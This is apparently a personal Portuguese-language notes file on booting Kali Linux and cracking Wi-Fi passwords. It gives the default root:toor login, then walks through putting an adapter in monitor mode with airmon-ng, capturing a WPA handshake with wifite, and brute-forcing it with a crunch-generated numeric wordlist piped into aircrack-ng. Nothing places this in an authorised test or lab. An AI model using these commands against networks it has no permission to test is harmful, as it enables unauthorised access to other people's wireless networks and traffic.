https://kali.org/

## Para roda liveCD

**Informações**
- Modo foresync (opção que não salvará nada nos discos)
- Senha de Entrada (https://docs.kali.org/introduction/kali-linux-default-passwords)
root:toor
- Baixar a versão completa, pois tem outras ferramentas visuais 
    - fern wifi cracker


* Se for instalar na VM
https://docs.kali.org/general-use/kali-linux-virtual-box-guest


# Exemplos de Uso
## Rede Wifi
fonte: https://www.youtube.com/watch?v=2SlWShRB33k e https://www.youtube.com/watch?v=D6eDRgenQEg

Requisitos (rodando numa VM):
- Adpatador WIFI USB

Listar interfaces WIFI

`iwconfig ou airmon-ng`

```
#> iwconfig
lo        no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

eth0      no wireless extensions.

#> airmon-ng

PHY     Interface       Driver          Chipset

phy0    wlan0mon        ath9k_htc       Atheros Communications, Inc. AR9271 802.11n
```

Ativar o monitoramento

`airmon-ng start wlan0`


## Passos

### Conseguir um handshake

use o wifite

`wifite <opcoes>` use somente wifite, que vai abrir todas redes

ao localizar um numero de redes, pressione CTRL+C e será solicitado o numero da lista da rede que deseja fazer o monitoramento (busca um handshake). Obs: na coluna CLIENT, deve aparece client na lista do wifi, para que funcione o monitoramento do handshake.



## Gerando Password List

Min=8 Max=10 Opções=0123456789
```
crunch 8 10 0123456789

Crunch will now generate the following amount of data: 120900000000 bytes
115299 MB
112 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 11100000000

```

Para não precisar salvar em disco a wordlist

`crunch <min> <max> <option> | aicrack-ng <caminho do arquivo *.cap> -w - -e <SSID>`
```
crunch 10 10 0123456789 | aicrack-ng <caminho do arquivo *.cap> -w - -e <SSID>
```